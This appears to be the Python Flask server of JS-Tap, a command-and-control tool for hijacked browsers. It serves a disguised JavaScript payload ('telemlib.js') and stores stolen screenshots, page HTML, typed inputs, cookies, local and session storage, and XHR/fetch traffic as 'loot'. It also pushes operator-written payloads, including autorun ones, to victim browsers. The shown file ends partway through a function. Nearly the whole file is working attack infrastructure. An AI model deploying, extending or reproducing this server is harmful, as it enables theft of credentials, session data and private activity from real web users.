#!usr/bin/env python
from flask import Flask, jsonify, abort, make_response, g, request, render_template, redirect, url_for, send_from_directory
from werkzeug.serving import WSGIRequestHandler
from werkzeug.middleware.proxy_fix import ProxyFix
from flask_cors import CORS
from markupsafe import Markup, escape
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import DateTime, func
from sqlalchemy_utils import database_exists
from flask_login import LoginManager, login_user, logout_user, UserMixin, login_required, current_user
from flask_bcrypt import Bcrypt
from enum import Enum
from user_agents import parse
import magic
import json
import uuid
import os
import time
import threading
import string
import random
import shutil



#***************************************************************************
# Configuration

# Proxy mode
# Handy for running nginx proxy in front
# of JS-Tap server to handle SSL certs.
# If set to True
# JS-Tap will run http and rely on nginx
# Note that nginx needs to set an X-Forwarded-For 
# header or JS-Tap won't know the IP address of the cliet
# -----
# If set to False JS-Tap will use a 
# self signed cert
proxyMode = False


# Data Directory
# File path to folder where loot directory 
# and SQLite database are saved
dataDirectory = "./"



#***************************************************************************
# Initialization stuff
app = Flask(__name__)
CORS(app)
baseDir = os.path.abspath(os.path.dirname(__file__))
app.config["SQLALCHEMY_DATABASE_URI"] = 'sqlite:///' + os.path.abspath(dataDirectory + 'jsTap.db')
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False

# app.config['SECRET_KEY'] = 'b4CtXzlMp9tsATa3i7jgNiB10eiJbrQG'
app.config['SECRET_KEY'] = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=45))

app.config['SESSION_COOKIE_SECURE']   = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'

db = SQLAlchemy(app)
login_manager = LoginManager()
login_manager.login_view = 'login'
login_manager.init_app(app)
bcrypt = Bcrypt(app)



# *********************************************************************

def printHeader():
    print("""
                                        ▐▄▄▄.▄▄ ·                       
             .* ./,                      ·██▐█ ▀.                 
             ,    ,,,                  ▪▄ ██▄▀▀▀█▄                                            
            *     .,.*                 ▐▌▐█▌▐█▄▪▐█                                            
           ,*      ,. *.                ▀▀▀• ▀▀▀▀              .(/,#/            
           *        *  *,         .,,.                      ,#%&&&&#            
          ./        ,,  /.          ./#%%&&&&&&&&&&&&%#((//,  ,#%%#/*           
          *,        .*  .(,               ,/#%%&&&&&&&&&&&&&#,   ,   ,.         
          #,         *.  ,(                    .*#%&&&&&&&&&&&%#*     *         
         ,#          .,   /,                  ./(#(  ,*#%%&&&&&&&&(. ,.         
         ,/          .*   ,/                 *%%#(%%%%(   .*(%%%%%&#(,          
 ./*.  ../(,,*******/,/.  ,%/////.         .(*  ,%%%%/     */  ...,%%%%/.       
 *.                 *//   ,#     *.       /,          .***,(.,/    , ,(###*     
 ,,.*,,*/(##((/*/***///   (*....,(.     *,           .*/(%%%(,(*..*.      .*/.  
          #,     .,, /*  */..(*,      ,,       .,/(/,(%%&&&&&&&&%%%/.           
          **         /. ,/  ,,*,    ,,    ,//,       */%%%%%&&&&&&%%%#*         
          .(        */ .*  .*,, , .***,.             *(/%%%%%((#%%%%%%%%#*      
           /       .(,**  *.*,. .,                   *%((%%&%&(#&%&#%%&%%%%(,   
           */      /(/, .*.(.     ,*,               .#%%//%%%&(%&&&(%&&&&&&&&%* 
            (,    *%/.  ,.**... ,..(%%(,           .(%%%#*#%&#(&&%#/&&&&&&&&&&%#
            ./   ,(, ** ..  *,,/**%%&&&%%%#/,,..  *#%%%%* *%#*%&&%((&&&&&&&&&&&&
             ,/.*,    *%(.  .  , .*#%%%%%%%&&&&/(/#%%%#,  .##%&&&%/%&&&&&&&&&&&&
                     .((/,....         ,/##%%%%&&%&%%(.    *%&&&%/%&&&&&&&&&&&&&
                                     ▄▄▄▄▄ ▄▄▄·  ▄▄▄·
                                     •██  ▐█ ▀█ ▐█ ▄█  
                                      ▐█.▪▄█▀▀█  ██▀·  
                                      ▐█▌·▐█ ▪▐▌▐█▪·•  
                                      ▀▀▀  ▀  ▀ .▀   
                                       𝚋𝚢 @𝚑𝚘𝚘𝚍𝚘𝚎𝚛
                               𝚑𝚘𝚘𝚍𝚘𝚎𝚛@𝚋𝚒𝚝𝚠𝚒𝚜𝚎𝚖𝚞𝚗𝚒𝚝𝚒𝚘𝚗𝚜.𝚍𝚎𝚟
        """)



#***************************************************************************
# Support Data
SessionDirectories = {}
SessionImages = {}
SessionHTML = {}
lootDirCounter = 1
threadLock = ""
databaseLock = ""


logFileName = "sessionLog.txt"



# Needed to generate human readable nicknames
AdjectiveList = {
        "funky",
        "smelly",
        "skunky",
        "merry",
        "whimsical",
        "amusing",
        "hysterical",
        "bumfuzzled",
        "bodacious",
        "absurd",
        "animated",
        "brazen",
        "cheesy",
        "clownish",
        "confident",
        "crazy",
        "cuckoo",
        "deranged",
        "ludicrous",
        "playful",
        "quirky",
        "screwball",
        "slapstick",
        "wacky",
        "excited",
        "humorous",
        "charming",
        "confident",
        "fanatical"
}

ColorList = {
        "blue",
        "red",
        "green",
        "white",
        "black",
        "brown",
        "azure",
        "pink",
        "yellow",
        "silver",
        "purple",
        "orange",
        "grey",
        "fuchsia",
        "crimson",
        "lime",
        "plum",
        "olive",
        "cyan",
        "ivory",
        "magenta"
}


MurderCritter = {
        "kangaroo",
        "koala",
        "dropbear",
        "wombat",
        "wallaby",
        "dingo",
        "emu",
        "tassiedevil",
        "platypus",
        "salty",
        "kookaburra",
        "boxjelly",
        "blueringoctopus",
        "taipan",
        "stonefish",
        "redback",
        "cassowary",
        "funnelwebspider",
        "conesnail",
        "quokka",
        "echidna",
        "dugong",
        "sugarglider",
        "blackswan"
}






#***************************************************************************
# Database classes
class Client(db.Model):
    id           = db.Column(db.Integer, primary_key=True)
    nickname     = db.Column(db.String(100), unique=True, nullable=False)
    uuid         = db.Column(db.String(40), unique=True, nullable=False)
    sessionValid = db.Column(db.Boolean, nullable=False, default=True)
    notes        = db.Column(db.Text, nullable=True)
    firstSeen    = db.Column(db.DateTime(timezone=True),server_default=func.now())
    lastSeen     = db.Column(db.DateTime(timezone=True), server_default=func.now())
    ipAddress    = db.Column(db.String(20), nullable=True)
    platform     = db.Column(db.String(100), nullable=True)
    browser      = db.Column(db.String(100), nullable=True)
    isStarred    = db.Column(db.Boolean, nullable=False, default=False)


    def update(self):
        print("$$ Client Update func")
        self.lastSeen = func.now()

    def __repr__(self):
        return f'<Client {self.id}>'


# Keep screenshots as files on disk, just track the filename
class Screenshot(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    clientID  = db.Column(db.String(100), nullable=False)
    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
    fileName  = db.Column(db.String(100), nullable=False)
  
    def __repr__(self):
        return f'<Screenshot {self.id}>'


class HtmlCode(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    clientID  = db.Column(db.String(100), nullable=False)
    url       = db.Column(db.String(100), nullable=False)
    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
    code      = db.Column(db.Text, nullable=True)
    fileName  = db.Column(db.String(100), nullable=False)


    def __repr__(self):
        return f'<HtmlCode {self.id}>'


class UrlVisited(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    clientID  = db.Column(db.String(100), nullable=False)
    url       = db.Column(db.String(100), nullable=False)
    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<UrlVisited {self.id}>'


class UserInput(db.Model):
    id         = db.Column(db.Integer, primary_key=True)
    clientID   = db.Column(db.String(100), nullable=False)
    inputName  = db.Column(db.String(100), nullable=False)
    inputValue = db.Column(db.String(100), nullable=False)
    timeStamp  = db.Column(db.DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<UserInput {self.id}>'


class Cookie(db.Model):
    id          = db.Column(db.Integer, primary_key=True)
    clientID    = db.Column(db.String(100), nullable=False)
    cookieName  = db.Column(db.String(100), nullable=False)
    cookieValue = db.Column(db.String(100), nullable=False)
    timeStamp   = db.Column(db.DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<Cookie {self.id}>'


class LocalStorage(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    clientID  = db.Column(db.String(100), nullable=False)
    key       = db.Column(db.String(100), nullable=False)
    value     = db.Column(db.String(100), nullable=False)
    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<LocalStorage {self.id}>'


class SessionStorage(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    clientID  = db.Column(db.String(100), nullable=False)
    key       = db.Column(db.String(100), nullable=False)
    value     = db.Column(db.String(100), nullable=False)
    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<SessionStorage {self.id}>'


class XhrOpen(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    clientID  = db.Column(db.String(100), nullable=False)
    method    = db.Column(db.String(100), nullable=False)
    url       = db.Column(db.String(300), nullable=False)
    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<XhrOpen {self.id}>'


class XhrSetHeader(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    clientID  = db.Column(db.String(100), nullable=False)
    header    = db.Column(db.String(100), nullable=False)
    value     = db.Column(db.String(300), nullable=False)
    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<XhrSetHeader {self.id}>'


class XhrCall(db.Model):
    id           = db.Column(db.Integer, primary_key=True)
    clientID     = db.Column(db.String(100), nullable=False)
    requestBody  = db.Column(db.Text, nullable=True);
    responseBody = db.Column(db.Text, nullable=True);
    timeStamp    = db.Column(db.DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<XhrCall {self.id}>'


class FetchSetup(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    clientID  = db.Column(db.String(100), nullable=False)
    method    = db.Column(db.String(100), nullable=False)
    url       = db.Column(db.String(300), nullable=False)
    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<FetchSetup {self.id}>'


class FetchHeader(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    clientID  = db.Column(db.String(100), nullable=False)
    header    = db.Column(db.String(100), nullable=False)
    value     = db.Column(db.String(300), nullable=False)
    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<FetchHeader {self.id}>'


class FetchCall(db.Model):
    id           = db.Column(db.Integer, primary_key=True)
    clientID     = db.Column(db.String(100), nullable=False)
    requestBody  = db.Column(db.Text, nullable=True);
    responseBody = db.Column(db.Text, nullable=True);
    timeStamp    = db.Column(db.DateTime(timezone=True), server_default=func.now())

    def __repr__(self):
        return f'<FetchCall {self.id}>'


class Event(db.Model):
    id        = db.Column(db.Integer, primary_key=True)
    clientID  = db.Column(db.String(100), nullable=False)
    timeStamp = db.Column(db.DateTime(timezone=True))
    eventType = db.Column(db.String(100), nullable=False)
    eventID   = db.Column(db.Integer, nullable=False)

    def __repr__(self):
        return f'<Event {self.id}>'


# Application settings
class AppSettings(db.Model):
    id                = db.Column(db.Integer, primary_key=True)
    allowNewSesssions = db.Column(db.Boolean, default=True)

    def __repr__(self):
        return f'<AppSettings {self.id}>'



class CustomPayload(db.Model):
    id          = db.Column(db.Integer, primary_key=True)
    name        = db.Column(db.String(100), nullable=False)
    description = db.Column(db.Text, nullable=True)
    code        = db.Column(db.Text, nullable=False)
    autorun     = db.Column(db.Boolean, nullable=False, default=False)

    def __repr__(self):
        return f'<CustomPayload {self.id}>'



class ClientPayloadJob(db.Model):   
    id          = db.Column(db.Integer, primary_key=True)
    clientKey   = db.Column(db.Integer, nullable=False)
    code        = db.Column(db.Text, nullable=False)

    def __repr__(self):
        return f'<ClientPayloadJob {self.id}>'



# User C2 UI session
class User(UserMixin, db.Model):
    __table_name__ = 'user'
    username       = db.Column(db.String, primary_key=True)
    password       = db.Column(db.String, nullable=False)
    authenticated  = db.Column(db.Boolean, default=False)

    def is_active(self):
        # We don't need to deactivate user accounts, but
        # this is a required method
        return True

    def get_id(self):
        return self.username

    def is_authenticated(self):
        return self.authenticated

    def is_anonymous(self):
        # Another unused but required method
        return False





#***************************************************************************
# Support Functions



# Thread safe raw data logging
# Could put database stuff here...
def logEvent(identifier, logString):
    threadLock.acquire()
    # print("++ Start logEvent")
    lootPath = dataDirectory + 'lootFiles/client_' + str(SessionDirectories[identifier])

    # We're going to append to the logfile
    sessionFile = open(lootPath + "/" + logFileName, "a")
    #print("In logEvent with time: " + str(time.localtime(time.time())))
    sessionFile.write(str(time.time()) + ": " + logString + "\n")
    sessionFile.close()
    threadLock.release()
    # print("-- End logEvent")



# Need function to check session, return download directory
def findLootDirectory(identifier):
    lootDir = "client_" + str(SessionDirectories[identifier])
    #print("Loot directory is: " + lootDir)
    return lootDir



def dbCommit():
    databaseLock.acquire()
    db.session.commit()
    databaseLock.release()



# Updates "last seen" timestamp"
def clientSeen(identifier, ip, userAgent):
    print("!! Client seen: " + str(ip) + ', ' + userAgent)
    # print("*** Starting clientSeen Update!")

    parsedUserAgent = parse(userAgent)
    # print("--Browser: " + parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string)
    # print("--Platform: " + parsedUserAgent.os.family)


    # DB commit is handled by caller to clientSeen() method, don't do it here
    client = Client.query.filter_by(uuid=identifier).first()
    client.ipAddress = ip
    client.platform  = parsedUserAgent.os.family
    client.browser   = parsedUserAgent.browser.family + " " + parsedUserAgent.browser.version_string

    # update method touches the database lastseen timestamp
    client.update()
    # print("--- Done client seen update...")





# Check if the UUID sent by client is valid
# and hasn't had it's session invalidated
def isClientSessionValid(identifier):
    client = Client.query.filter_by(uuid=identifier).first()
    if client:
        # Ok, valid client UUID. Check if session is still good
        if (client.sessionValid):
            return True
        else:
            return False
    else:
        # client UUID not in database, shenanigans I say
        return False



# Needed by flask-login
@login_manager.user_loader
def user_loader(username):
    return User.query.filter_by(username=username).first()


# Need an admin account
def addAdminUser():
    passwordLength = 45

    randomPassword = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase 
        + string.digits, k=passwordLength))


    print("*******************************")
    print("WebApp admin creds:")
    print("admin : " + randomPassword)
    print("*******************************")

    adminUser = User(username='admin', password=bcrypt.generate_password_hash(randomPassword))

    db.session.add(adminUser)
    dbCommit()




# Initialize app defaults
def initApplicationDefaults():
    appSettings = AppSettings(allowNewSesssions=True)

    db.session.add(appSettings)
    dbCommit()




# Generate a client nickname
# If a client already has the nickname, append a number to 
# the end so they're unique
def generateNickname():
    randomAdjective = random.choice(list(AdjectiveList))
    randomColor     = random.choice(list(ColorList))
    randomCritter   = random.choice(list(MurderCritter))

    newNickname = randomAdjective + '-' + randomColor + '-' + randomCritter

    counter = 0
    while Client.query.filter_by(nickname=newNickname).count():
        baseNickname = newNickname.replace('-'+ str(counter), '')
        # print("Base nickname created: " + baseNickname)
        counter += 1


        newNickname = baseNickname + '-' + str(counter)
        # print("Still looping for name, counter: " + str(counter))
        # print("Current newNickname: " + newNickname)

    return newNickname




#***************************************************************************
# Response header handling
@app.after_request
def afterRequestHeaders(response):
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    response.headers['X-Content-Type-Options']    = 'nosniff'
    response.headers['X-Frame-Options']           = 'DENY'
    response.headers['Content-Security-Policy']   = "default-src 'self' style-src 'self' script-src 'self' connect-sec 'self' img-src 'self' data: frame-ancestors 'none' object-src 'self'  'unsafe-inline'"

    # Server header is set in main function
 
    return response




# Page Endpoints

# Send a copy of the payload
@app.route('/lib/telemlib.js', methods=['GET'])
def sendPayload():
    with open('./telemlib.js', 'rb') as file:
        payload = file.read()
        response = make_response(payload, 200)
        response.mimetype = 'text/javascript'

        return response



# Send c2 UI index page
@app.route('/', methods=['GET'])
@login_required
def sendIndex():
    with open('./index.html', 'r') as file:
        index = file.read()
        response = make_response(index, 200)
        #response.mimetype('text/html')

        return response



# Serve up loot files
# for images and HTML code
@app.route('/loot/<path:path>')
@login_required
def sendLootFile(path):

    # If HTML the user needs to download it the loot file, not render it
    # Rendering the HTML copy in the browswer will likely hit the target server
    # with CSS/JavaScript requests from our browser. No good. 
    if "htmlCopy.html" in path:
        # print("### We're serving up stolent HTML!")
        return send_from_directory(dataDirectory + 'lootFiles', path, as_attachment=True)
    else:
        # Just display the screenshot in the browser, this is safe
        # print("#### Serving up screenshot!")    
        return send_from_directory(dataDirectory + 'lootFiles', path)


# Serve up static files
# that need to be authenticated
@app.route('/protectedStatic/<path:path>')
@login_required
def sendProtectedStaticFile(path):
    return send_from_directory('protectedStatic', path)





@app.route('/login', methods=['POST', 'GET'])
def login():
    print("Top of login...")

    if request.method == 'GET':
        print("** Handling login GET...")
        with open('./login.html', 'r') as file:
            loginForm = file.read()
            response = make_response(loginForm, 200)
            #response.mimetype('text/html')

            return response


    if request.method == 'POST':
        print("** Handling login POST...")
        username = request.form['username']
        password = request.form['password']

        user = User.query.filter_by(username=username).first()

        if user:
            isValidPassword = bcrypt.check_password_hash(user.password, password) 

            if isValidPassword:
                print("Password matched!")
                login_user(user)
                return redirect(url_for('sendIndex'))
                # response = make_response("Successful login.", 200)
                # return response
            else:
                print("Auth: Password didn't match")
                response = make_response("No.", 401)
                return response
                print("Password didn't match :(")
        else:
            # Make sure equal processing time, avoiding time based user enum
            hash = bcrypt.generate_password_hash(password)

            print("Auth: User not found")
            response = make_response("No.", 401)
            return response



@app.route('/logout', methods=['GET'])
def logout():
    logout_user()
    return redirect("login")


#***************************************************************************
# Loot and Payload Client API endpoints

# Get UUID for client token
@app.route('/client/getToken', methods=['GET'])
def returnUUID():
    # Check to see if we're still allowing new client connections
    appSettings = AppSettings.query.filter_by(id=1).first()

    print("In UUID, app setting is: " + str(appSettings.allowNewSesssions))
    if (appSettings.allowNewSesssions == False):
        return "No.", 401

    # We're still allowing new connections, 
    # setup a new client
    token = str(uuid.uuid4())

    # Setup new client
    global lootDirCounter

    threadLock.acquire()
    print("New session for client: " + token)


    # Database Entry
    newNickname = generateNickname()
    newClient   = Client(uuid=str(token), nickname=newNickname, notes="")
    db.session.add(newClient)
    db.session.commit()

    # Initialize our storage
    SessionDirectories[token] = lootDirCounter
    lootDirCounter = lootDirCounter + 1
    lootPath = dataDirectory + 'lootFiles/client_' + str(SessionDirectories[token])
    #print("Checking if loot dir exists: " + lootPath)

    if not os.path.exists(lootPath):
        #print("Creating directory...")
        os.mkdir(lootPath)
        sessionFile = open(lootPath + "/" + logFileName, "w")
        sessionFile.write("Session identifier: ")
        sessionFile.write(token + "\n")
        sessionFile.close()

        # Record the client index
        clientFile = open(dataDirectory + "lootFiles/clients.txt", "a")
        clientFile.write(str(time.time()) + ", " + token + ": " + lootPath + "\n")
        clientFile.close()
    # else:
    #     print("Loot directory already exists")

    # Initialize our number trackers
    SessionImages[token] = 1;
    SessionHTML[token]   = 1;
    
    threadLock.release()

    # Add any autorun payloads for this client
    payloads = CustomPayload.query.filter_by(autorun=True)
    client   = Client.query.filter_by(uuid=token).first()

    for payload in payloads:
        newJob = ClientPayloadJob(clientKey=client.id, code=payload.code)
        db.session.add(newJob)
    dbCommit()

    uuidData = {'clientToken':token}

    return jsonify(uuidData)



# Check for custom payload jobs for the client
@app.route('/client/taskCheck/<identifier>', methods=['GET'])
def returnPayloads(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    client   = Client.query.filter_by(uuid=identifier).first()
    payloads = ClientPayloadJob.query.filter_by(clientKey=client.id)

    taskedPayloads = [{'id':payload.id, 'data':payload.code} for payload in payloads]

    for payload in payloads:
        db.session.delete(payload)
        dbCommit()

    return jsonify(taskedPayloads)





# Capture screenshot
@app.route('/loot/screenshot/<identifier>', methods=['POST'])
def recordScreenshot(identifier):
    # print("Received image from: " + identifier)
    #print("Looking up loot dir...")

    if not isClientSessionValid(identifier):
        return "No.", 401


    lootDir   = findLootDirectory(identifier)
    image     = request.data
    file_type = magic.from_buffer(image, mime=True)

    # Make sure the html2canvas screenshot is 
    # what we're expecting. Definitely don't want SVGs
    if file_type != 'image/png':
        # Shenanigans from the 'client' are afoot
        print("!!!! Wrong screenshot filetype!")
        print("---- Type: " + file_type)
        return "No.", 401

    if identifier in SessionImages.keys():
        imageNumber = SessionImages[identifier]
        #print("Using image number: " + str(imageNumber))
        SessionImages[identifier] = imageNumber + 1
    else:
        raise RuntimeError("Session image counter not found")
        quit()

    #print("Writing the file to disk...")
    with open (dataDirectory + "lootFiles/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png", "wb") as binary_file:
        logEvent(identifier, "Screenshot: " + str(imageNumber) + "_Screenshot.png")
        binary_file.write(image)
        binary_file.close()

    # Put it in the DB
    newScreenshot = Screenshot(clientID=identifier, fileName="./loot/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png")
    db.session.add(newScreenshot)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db.session.refresh(newScreenshot)
    newEvent = Event(clientID=identifier, timeStamp=newScreenshot.timeStamp, 
    eventType='SCREENSHOT', eventID=newScreenshot.id)
    db.session.add(newEvent)
    dbCommit()



    return "ok", 200



# Capture the HTML seen
@app.route('/loot/html/<identifier>', methods=['POST'])
def recordHTML(identifier):
    # print("Got HTML from: " + identifier)

    if not isClientSessionValid(identifier):
        return "No.", 401

    lootDir = findLootDirectory(identifier)
    content = request.json 
    url = content['url']
    trapHTML = content['html']


    if identifier in SessionHTML.keys():
        htmlNumber = SessionHTML[identifier]
        SessionHTML[identifier] = htmlNumber + 1
    else:
        raise RuntimeError("Session HTML counter not found")
        quit()

    lootFile = dataDirectory + "lootFiles/" + lootDir + "/" + str(htmlNumber) + "_htmlCopy.html"

    with open (lootFile, "w") as html_file:
        logEvent(identifier, "HTML Copy: " + str(htmlNumber) + "_htmlCopy.html")
        html_file.write(trapHTML)
        html_file.close()


    # Put it in the DB
    newHtml = HtmlCode(clientID=identifier, url=content['url'], 
        code=content['html'], fileName = lootFile)
    db.session.add(newHtml)


    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr


    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db.session.refresh(newHtml)
    newEvent = Event(clientID=identifier, timeStamp=newHtml.timeStamp, 
        eventType='HTML', eventID=newHtml.id)
    db.session.add(newEvent)
    dbCommit()


    return "ok", 200




# Record new URL visited in trap
@app.route('/loot/location/<identifier>', methods=['POST'])
def recordUrl(identifier):
    # print("New URL recorded from: " + identifier)
    if not isClientSessionValid(identifier):
        return "No.", 401

    lootDir = findLootDirectory(identifier)
    content = request.json
    url = content['url']
    # print("Got URL: " + url)
    logEvent(identifier, "URL Visited: " + url)

    # Put it in the DB
    newUrl = UrlVisited(clientID=identifier, url=content['url'])
    db.session.add(newUrl)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db.session.refresh(newUrl)
    newEvent = Event(clientID=identifier, timeStamp=newUrl.timeStamp, 
    eventType='URLVISITED', eventID=newUrl.id)
    db.session.add(newEvent)
    dbCommit()

    return "ok", 200




# Record user inputs
@app.route('/loot/input/<identifier>', methods=['POST'])
def recordInput(identifier):
    # print("New input recorded from: " + identifier)
    if not isClientSessionValid(identifier):
        return "No.", 401

    lootDir = findLootDirectory(identifier)
    content = request.json
    inputName = content['inputName']
    inputValue = content['inputValue']
    # print("Got input: " + inputName + ", value: " + inputValue)
    logEvent(identifier, "User input field: " + inputName + ", value: " + inputValue)


    # Put it in the DB
    newInput = UserInput(clientID=identifier, inputName=content['inputName'], inputValue=content['inputValue'])
    db.session.add(newInput)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db.session.refresh(newInput)
    newEvent = Event(clientID=identifier, timeStamp=newInput.timeStamp, 
    eventType='USERINPUT', eventID=newInput.id)
    db.session.add(newEvent)
    dbCommit()    

    return "ok", 200



# Record whatever cookies we can get our hands on
# Note that any httpOnly flagged cookies we won't get
# which would probably include any session cookies. Probably. 
@app.route('/loot/dessert/<identifier>', methods=['POST'])
def recordCookie(identifier):
    # print("New cookie recorded from: " + identifier)
    if not isClientSessionValid(identifier):
        return "No.", 401

    lootDir = findLootDirectory(identifier)
    content = request.json
    cookieName = content['cookieName']
    cookieValue = content['cookieValue']
    # print("Cookie name: " + content['cookieName'] + ", value: " + content['cookieValue'])
    logEvent(identifier, "Cookie Name: " + cookieName + ", value: " + cookieValue)


    # Put it in the DB
    newCookie = Cookie(clientID=identifier, cookieName=cookieName, cookieValue=cookieValue)
    db.session.add(newCookie)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db.session.refresh(newCookie)
    newEvent = Event(clientID=identifier, timeStamp=newCookie.timeStamp, 
    eventType='COOKIE', eventID=newCookie.id)
    db.session.add(newEvent)
    dbCommit()    

    return "ok", 200



# Record local storage data bits
@app.route('/loot/localstore/<identifier>', methods=['POST'])
def recordLocalStorageEntry(identifier):
    # print("New localStorage data recorded from: " + identifier)
    if not isClientSessionValid(identifier):
        return "No.", 401


    lootDir = findLootDirectory(identifier)
    content = request.json
    localStorageKey = content['key']
    localStorageValue = content['value']
    logEvent(identifier, "Local Storage Entry: " + localStorageKey + ", value: " + localStorageValue)


    # Put it in the DB
    newLocalStorage = LocalStorage(clientID=identifier, key=localStorageKey, value=localStorageValue)
    db.session.add(newLocalStorage)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db.session.refresh(newLocalStorage)
    newEvent = Event(clientID=identifier, timeStamp=newLocalStorage.timeStamp, 
    eventType='LOCALSTORAGE', eventID=newLocalStorage.id)
    db.session.add(newEvent)
    dbCommit()    

    return "ok", 200



# Record session storage data bits
@app.route('/loot/sessionstore/<identifier>', methods=['POST'])
def recordSessionStorageEntry(identifier):
    # print("New sessionStorage data recorded from: " + identifier)
    if not isClientSessionValid(identifier):
        return "No.", 401
 
    lootDir = findLootDirectory(identifier)
    content = request.json 
    sessionStorageKey   = content['key']
    sessionStorageValue = content['value']
    logEvent(identifier, "Session Storage Entry: " + sessionStorageKey + ", value: " + sessionStorageValue)

    # Put it in the DB
    newSessionStorage = SessionStorage(clientID=identifier, key=sessionStorageKey, value=sessionStorageValue)
    db.session.add(newSessionStorage)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()


    # add to global event table
    db.session.refresh(newSessionStorage)
    newEvent  = Event(clientID=identifier, timeStamp=newSessionStorage.timeStamp, 
    eventType ='SESSIONSTORAGE', eventID=newSessionStorage.id)
    db.session.add(newEvent)
    dbCommit()    

    return "ok", 200




# Record XHR API Open calls
@app.route('/loot/xhrOpen/<identifier>', methods=['POST'])
def recordXhrOpen(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    print("## Recording XHR open event")
    content = request.json 
    method  = content['method']
    url     = content['url']
    logEvent(identifier, "XHR Open: " + method + ", " + url)

    # Put it in the database
    newXhrOpen = XhrOpen(clientID=identifier, method=method, url=url)
    db.session.add(newXhrOpen)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db.session.refresh(newXhrOpen)
    newEvent = Event(clientID=identifier, timeStamp=newXhrOpen.timeStamp, 
    eventType='XHROPEN', eventID=newXhrOpen.id)
    db.session.add(newEvent)
    dbCommit()    

    return "ok", 200



# Record XHR API Header calls
@app.route('/loot/xhrSetHeader/<identifier>', methods=['POST'])
def recordXhrHeader(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    print("## Recording XHR Header event")
    content = request.json 
    header  = content['header']
    value   = content['value']
    logEvent(identifier, "XHR Set Header: " + header + ", " + value)

    # Put it in the database
    newXhrHeader = XhrSetHeader(clientID=identifier, header=header, value=value)
    db.session.add(newXhrHeader)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db.session.refresh(newXhrHeader)
    newEvent  = Event(clientID=identifier, timeStamp=newXhrHeader.timeStamp, 
    eventType ='XHRSETHEADER', eventID=newXhrHeader.id)
    db.session.add(newEvent)
    dbCommit()    

    return "ok", 200



# Record XHR API calls
@app.route('/loot/xhrCall/<identifier>', methods=['POST'])
def recordXhrCall(identifier):
    if not isClientSessionValid(identifier):
        return "No.", 401

    print("## Recording XHR api call")
    content      = request.json 
    requestBody  = content['requestBody']
    responseBody = content['responseBody']
    logEvent(identifier, "XHR API Call: " + requestBody + ", " + responseBody)

    # Put it in the database
    newXhrCall = XhrCall(clientID=identifier, requestBody=requestBody, responseBody=responseBody)
    db.session.add(newXhrCall)

    if (proxyMode):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr

    clientSeen(identifier, ip, request.headers.get('User-Agent'))
    dbCommit()

    # add to global event table
    db.session.refresh(newXhrCall)
    newEvent  = Event(clientID=identifier, timeStamp=newXhrCall.timeStamp, 
    eventType ='XHRCALL', eventID=newXhrCall.id)
